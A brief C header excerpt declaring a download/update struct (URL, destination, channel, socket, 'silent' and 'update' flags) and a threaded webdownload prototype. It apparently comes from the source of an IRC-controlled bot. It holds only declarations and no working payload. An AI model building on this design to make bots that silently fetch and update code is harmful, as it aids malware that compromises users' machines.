 #ifndef NO_DOWNLOAD
// download/update structure
 typedef struct ds {
	char url[256];
	char dest[256];
	char chan[128];
	SOCKET sock;
	int run;
	int threadnum;
	int update;
	BOOL silent;
	BOOL gotinfo;
 } ds;
 #endif

  #ifndef NO_DOWNLOAD
 DWORD WINAPI webdownload(LPVOID param);
 #endif